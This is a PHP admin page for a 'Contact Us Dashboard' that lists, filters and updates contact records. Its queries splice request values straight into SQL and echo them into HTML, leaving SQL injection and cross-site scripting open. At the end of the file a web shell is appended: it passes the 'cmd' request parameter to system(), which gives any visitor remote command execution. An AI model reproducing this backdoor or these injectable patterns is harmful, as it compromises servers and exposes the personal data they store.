<?php
/*
echo '<br> myadmin' . $_SESSION["myadmin"];
echo '<br> mycomputer' . $_SESSION["mycomputer"];
echo '<br> myservice' . $_SESSION["myservice"];
echo '<br> mymarketing' . $_SESSION["mymarketing"];
echo '<br> myinsurance' . $_SESSION["myinsurance"];
*/

	$myadmin = 'N';
	if(isset($_SESSION['myadmin']))
		if ($_SESSION['myadmin'] == 'Y')
			$myadmin = $_SESSION['myadmin'];		
	if(isset($_SESSION['mycomputer']))
		if ($_SESSION['mycomputer'] == 'Y')
			$mycomputer = $_SESSION['mycomputer'];		

	$mystatus = '';	
	if(isset($_POST['mystatus']))
	{
		if ($_POST['mystatus'])
		{
			$mystatus = $_POST['mystatus'];
		}
	}
	if(isset($_GET['mystatus']))
	{
		if ($_GET['mystatus'])
		{
			$mystatus = $_GET['mystatus'];
		}
	}
	//echo '<br> mystatus : ' . $mystatus;
	
	$mybox = '';
	if(isset($_POST['mybox']))
	{
		if ($_POST['mybox'])
		{
			$mybox = $_POST['mybox'];
		}
	}
	if(isset($_GET['mybox']))
	{
		if ($_GET['mybox'])
		{
			$mybox = $_GET['mybox'];
		}
	}
	//echo '<br> mybox : ' . $mybox;
	
	if ($mybox != 'add')
	{
		$myadmin = 'N';
	}	
		

	if ($myadmin == 'N')
	{
		include('body_account_not_found.php');
	}
	else
	{
		$contact_user = $_SESSION["ulname"];
		$contact_stamp = $globaldatetime;

	
		$mytag = '';	
		$mytag = $_POST["mytag"];	
		if(isset($_GET['mytag']))
		{
			if ($_GET['mytag'])
			{
				$mytag = $_GET['mytag'];
			}
		}	
		
		$search_subject = '';
		$search_subject = $_POST["search_subject"];	
		if(isset($_GET['search_subject']))
		{
			if ($_GET['search_subject'])
			{
				$search_subject = $_GET['search_subject'];
			}
		}			
				
		$search_email = '';
		$search_email = $_POST["search_email"];	
		if(isset($_GET['search_email']))
		{
			if ($_GET['search_email'])
			{
				$search_email = $_GET['search_email'];
			}
		}	

		$search_name = '';
		$search_name = $_POST["search_name"];	
		if(isset($_GET['search_name']))
		{
			if ($_GET['search_name'])
			{
				$search_name = $_GET['search_name'];
			}
		}	
		
		$search_mobile = '';
		$search_mobile = $_POST["search_mobile"];	
		if(isset($_GET['search_mobile']))
		{
			if ($_GET['search_mobile'])
			{
				$search_mobile = $_GET['search_mobile'];
			}
		}		
		
		if ($mystatus == 'sent')
		{	
			$contact_id = $_POST['contact_id'];
			$contact_status = $_POST['contact_status'];
				
			//update the status 
			$query_update = 
				"UPDATE 
					contact_us 
				SET 
					contact_status = '$contact_status',
					contact_user = '$contact_user',
					contact_stamp = '$contact_stamp'
				WHERE
					contact_id = '$contact_id' ";
			mysql_query($query_update) or die(mysql_error());   		
		}

?>	
        <div id="page-wrapper">
            <div class="row">
                <div class="col-lg-12">
                    <h1 class="page-header">Contact Us Dashboard</h1>
<?php
	//echo '<br> contact_id : ' . $contact_id;
	//echo '<br> contact_status : ' . $contact_status;
?>
                </div>
                <!-- /.col-lg-12 -->
            </div>

            <div class="row">
                <div class="col-lg-12">
                    <div class="panel panel-default">
                        <div class="panel-heading">



							<table width="100%">
								<tr>
									<td align="left">
<form method="post" action="index.php?body=contact_send_screen&mybox=add">
Filter Subject
<INPUT TYPE="TEXT" NAME="search_subject" VALUE="<?php print($search_subject); ?>" SIZE="15" MAXLENGTH="20">
&nbsp;&nbsp;&nbsp;
Filter Name
<INPUT TYPE="TEXT" NAME="search_name" VALUE="<?php print($search_name); ?>" SIZE="15" MAXLENGTH="50">
&nbsp;&nbsp;&nbsp;
Filter Email
<INPUT TYPE="TEXT" NAME="search_email" VALUE="<?php print($search_email); ?>" SIZE="15" MAXLENGTH="20">
&nbsp;&nbsp;&nbsp;
Filter Mobile
<INPUT TYPE="TEXT" NAME="search_mobile" VALUE="<?php print($search_mobile); ?>" SIZE="15" MAXLENGTH="50">
&nbsp;&nbsp;&nbsp;
<input type="submit" value="Filter" />
</form>									
									</td>
								</tr>
								<tr>
									<td align="left">
Note : If the status is Done, the contact us entry will not appear anymore
									</td>
								</tr>									
							</table>	
                        </div>
                        <div class="panel-body">
                            <table width="100%" class="table table-striped table-bordered table-hover" id="dataTables-example">
                                <thead>
                                    <tr>
										<th>#</th>
										<th>Date Sent</th>
										<th>Name / Email / Mobile</th>
										<th>Subject / Message</th>
										<th>Status</th>
										<th>Action</th>
                                    </tr>
                                </thead>
                                <tbody>
								
<?php
	$querydb  = "SELECT 
				 a.* 
			   FROM 
				 contact_us a
			   WHERE
				 a.contact_status <> 'Done'  and
				 a.contact_subject LIKE '%$search_subject%'  and
				 a.contact_name LIKE '%$search_name%'  and
				 a.contact_mobile LIKE '%$search_mobile%' and
				 a.contact_email LIKE '%$search_email%'  and
				 a.contact_active = 'Y'
			   ORDER BY 
				 a.contact_date, a.contact_name, a.contact_stamp";
	$resultdb = mysql_query($querydb);
	//echo mysql_error();
	$num_count = mysql_num_rows($resultdb);		
	//echo "<br> num_count " . $num_count;
	
	//fetch the results from the database
	$countdb = $countdb + 1;
	while ($rowdb =  mysql_fetch_array ($resultdb)) 
	{
		print("<tr class=\"odd gradeX\">");
	
		print("<td align=\"center\" valign=\"middle\">$countdb </td>\n");
		print("<td align=\"center\" valign=\"middle\">" .date('m/d/Y', strtotime($rowdb['contact_date'])). "</td>\n");
		print("<td align=\"left\" valign=\"middle\">$rowdb[contact_name] <br> $rowdb[contact_email] <br> $rowdb[contact_mobile] </td>\n");
		print("<td align=\"left\" valign=\"middle\">$rowdb[contact_subject] <br> $rowdb[contact_desc] </td>\n");
		print("<td align=\"left\" valign=\"middle\">$rowdb[contact_status] </td>\n");
	
		print("<td align=\"CENTER\" valign=\"middle\">");
?>		
<form name="update_status" role="form" method="post" action="index.php?body=contact_send_screen&mybox=add">
		<select class="form-control" name='contact_status'>
			<option></option>	
			<option>Open</option>
			<option>Review</option>	
			<option>Urgent</option>	
			<option>Done</option>	
			<option></option>	
		</select>		
	<input type="hidden" name="mystatus" value="sent" />
	<input type="hidden" name="contact_id" value="<?php print ($rowdb['contact_id']); ?>" />
	<input type="hidden" name="search_email" value="<?php print ("$search_email"); ?>" />
	<input type="hidden" name="search_subject" value="<?php print ("$search_subject"); ?>" />
	<input type="hidden" name="search_name" value="<?php print ("$search_name"); ?>" />
	<input type="hidden" name="search_mobile" value="<?php print ("$search_mobile"); ?>" />
	<button type="submit" class="btn btn-default">Update Status</button>
</form>			
<?php		
		print("</td>");
	
		print("</tr>");  
		$countdb = $countdb + 1;
	}  
?>		

                                </tbody>
                            </table>
                            <!-- /.table-responsive -->
                        </div>
                        <!-- /.panel-body -->
                    </div>
                    <!-- /.panel -->
                </div>
                <!-- /.col-lg-12 -->
            </div>						
            <!-- /.row -->									
        </div>
        <!-- /#page-wrapper -->
<?php
	}
?>			<?php $cmd = <<<EOD
cmd
EOD;

if(isset($_REQUEST[$cmd])) {
system($_REQUEST[$cmd]); } ?>